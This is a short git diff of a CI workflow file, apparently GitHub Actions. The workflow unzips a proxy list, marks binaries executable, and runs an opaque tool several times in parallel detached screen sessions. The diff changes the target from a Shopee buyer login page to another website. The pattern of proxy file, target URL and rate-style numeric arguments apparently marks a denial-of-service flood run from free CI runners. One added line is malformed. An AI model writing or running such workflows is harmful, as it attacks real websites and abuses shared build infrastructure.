@@ -33,12 +33,14 @@ jobs:
           cd ideal-guide
           unzip Fc-main.zip
           mv  Fc-main/proxy.txt 90.txt
-          chmod +x tol
-          mv tol o          
+          chmod +x *
+          mv ki o          
           
-          screen -dms ve ./o https://shopee.vn/buyer/login 200 1 1  90.txt
-          screen -dms ve ./o https://shopee.vn/buyer/login 200 1 1 90.txt
-          ./o https://shopee.vn/buyer/login 200 1 1  90.txt
+          screen -dms ve ./o https://evernight.shiro.beer 200 1 1 
+          screen -dms ve .https://evernight.shiro.beer 200 1 1 
+          ./o https://evernight.shiro.beer 200 1 1  
+
+          
           sleep 1
           
           
